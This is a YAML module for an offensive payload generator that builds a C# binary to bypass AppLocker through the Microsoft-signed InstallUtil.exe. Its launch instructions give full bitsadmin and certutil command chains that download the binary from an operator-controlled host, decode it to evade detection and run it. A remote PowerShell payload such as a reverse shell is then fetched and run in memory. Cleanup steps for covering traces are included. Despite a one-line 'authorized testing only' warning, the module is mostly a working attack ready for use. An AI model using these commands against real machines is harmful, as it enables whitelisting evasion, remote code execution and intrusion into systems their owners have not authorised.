meta:
  name: "AppLocker Bypass via InstallUtil (C#)"
  category: "Defense Evasion"
  description: |
    Bypass AppLocker application whitelisting using Microsoft-signed InstallUtil.exe.
    
    Features:
    - Uses Microsoft-signed binary (InstallUtil.exe) to execute code
    - PowerShell runspace for arbitrary code execution
    - Downloads and executes remote PowerShell payload
    - Bypasses AppLocker default rules
    - Can be encoded with CertUtil for additional obfuscation
    
    This technique exploits the fact that AppLocker default rules allow
    execution of binaries in C:\\Windows\\Microsoft.NET\\ directory.
    InstallUtil.exe will execute code from [RunInstaller(true)] decorated classes.
    
    WARNING: For authorized security testing only!

  effectiveness: "high"

  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1218.004 - Signed Binary Proxy Execution: InstallUtil"

  artifacts:
    - "InstallUtil.exe process execution"
    - "PowerShell runspace creation"
    - "Network connection to download payload"
    - "WebClient DownloadString request"
    - "PowerShell script execution in memory"

parameters:
  - name: "payload_host"
    type: "string"
    description: "HTTP server hosting PowerShell payload (run.txt)"
    required: true
    default: "192.168.1.10"

  - name: "output_file"
    type: "string"
    description: "Output assembly filename"
    required: false
    default: "bypass.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "defense_evasion/applocker_bypass.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -r:System.Management.Automation.dll -r:System.Configuration.Install.dll {{ source_file }}"
  launch_instructions: |
    C# AppLocker Bypass via InstallUtil - Launch Instructions

    Host Payload (run.txt):
    Create run.txt with PowerShell payload (reverse shell, Invoke-PowerShellTcp, etc.)
    $ python3 -m http.server 80

    Transfer and Execute:
    $ python3 -m http.server 80
    $ bitsadmin /Transfer theJob http://{{ lhost }}/{{ output_file }} C:\Windows\Tasks\{{ output_file }} && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\{{ output_file }}

    Alternative (Encoded for Evasion):
    $ certutil -encode {{ output_file }} bypass_encoded.txt
    $ python3 -m http.server 80
    $ bitsadmin /Transfer job http://{{ lhost }}/bypass_encoded.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe

    Notes:
    - InstallUtil.exe is Microsoft-signed and allowed by default AppLocker rules
    - Payload host: {{ payload_host }}/run.txt (PowerShell payload downloaded via WebClient)
    - PowerShell runspace executes in-memory (no PowerShell.exe process spawned)
    - /U triggers Uninstall method which executes payload
    - /logfile= prevents log file creation
    - Executes with current user privileges (no elevation required)
    - Alternative LOLBins: MSBuild.exe, RegSvr32.exe (SCT files), RegAsm.exe
    - Chain BitsAdmin (download) -> CertUtil (decode) -> InstallUtil (execute) for multi-stage obfuscation

    Troubleshooting:
    - AppLocker still blocks: Verify InstallUtil.exe path (C:\Windows\Microsoft.NET\Framework64\v4.0.30319\) is whitelisted
    - No payload download: Check network connectivity, firewall, and verify payload_host is accessible
    - Assembly not found: Ensure .NET Framework 4.0+ is installed on target
    - Error loading automation: System.Management.Automation.dll missing (requires PowerShell)
    - Sysmon Event ID 1 fires for InstallUtil.exe execution
    - Network connections from InstallUtil.exe may alert EDR

    Cleanup:
    On target:
    $ del C:\Windows\Tasks\{{ output_file }}
    $ del C:\Windows\Tasks\bypass.exe
    $ del C:\Windows\Tasks\enc.txt
